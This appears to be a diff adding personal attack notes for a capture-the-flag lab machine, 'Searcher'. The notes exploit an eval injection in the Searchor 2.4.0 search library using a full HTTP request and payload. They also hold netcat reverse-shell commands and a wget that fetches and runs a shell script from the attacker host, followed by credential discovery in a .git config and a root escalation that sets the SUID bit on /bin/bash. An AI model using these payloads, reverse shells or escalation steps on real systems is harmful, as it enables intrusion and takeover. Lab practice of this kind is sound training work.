@@ -1,0 +1,68 @@
+http://searcher.htb/ runs off of Flask and uses an open source github project
+
+https://github.com/ArjunSharda/Searchor/releases/tag/v2.4.0
+
+https://security.snyk.io/package/pip/searchor/2.4.0 -> eval function give users code execution
+
+__import__("os").getcwd() --> outputs current directory when printed
+
+===== Achieved Code Execution ======
+POST /search HTTP/1.1
+Host: searcher.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Origin: http://searcher.htb
+Connection: close
+Referer: http://searcher.htb/
+Upgrade-Insecure-Requests: 1
+
+engine=Google&query=apple', print(__import__("os").getcwd()))#
+=====================================
+
+__import__('os').system('nc 10.10.10.10 1234 -e /bin/sh') --> rev shell code
+__import__('os').system('nc 10.10.14.48 4444 -e /bin/sh')
+
+Rev code didnt work, but we did find out the home directory of a user we're execing code from:
+engine=Google&query=apple', print(__import__("os").path.expanduser('~')))#
+
+/home/svc
+
+print(__import__("subprocess").getoutput("cat /home/svc/user.txt")) -> allows for shell like command exec
+
+user : 0d1f2bf3482955f7862e717e471990ac
+
+wget http://10.10.14.48:80/shell.sh -O /tmp/shell.sh -> chmod +x before wgetting
+/bin/bash /tmp/shell.sh -> gives us a shell on the box
+
+./ like commands arent valid on this box, u have to use /bin/bash to execute bash scripts
+=============================================================================
+The box has something called SNAP installed, this can be found in the /home/svc
+GTFO-Bins says if snap can be ran as sudo it can be abused
+
+cmd: snap version
+snap    2.58.2
+snapd   2.58.2
+series  16
+ubuntu  22.04
+kernel  5.15.0-69-generic
+
+Inside of /home/svc there was a .gitconfig
+with that we can then simple search directories [ls -a] and try finding anything with a .git directory
+
+/var/ww/app has a .git, inside /var/www/app/.git/config was a user and pass
+cody:jh1usoih2bkjaspwe92
+svc:jh1usoih2bkjaspwe92 -> SSH Login (WORKS!)
+
+sudo -l shows a command that can be ran
+
+sudo command : sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+After using the sudo command in both the /opt/scripts dir and say our home dir
+the script doesnt run correctly when we run the sudo command at the home dir
+this means that the full-checkup runs based on relative dir (meaning you have to be in the same dir as the full-checkup.sh in /opt/scripts to run), with this knowledge we can make our own full-checkup.sh script that chmod u+s /bin/bash
+Allowing us to now esc to root and cat the flag
+
+root:882e59b42f8bc2b44c28d26935cb149b
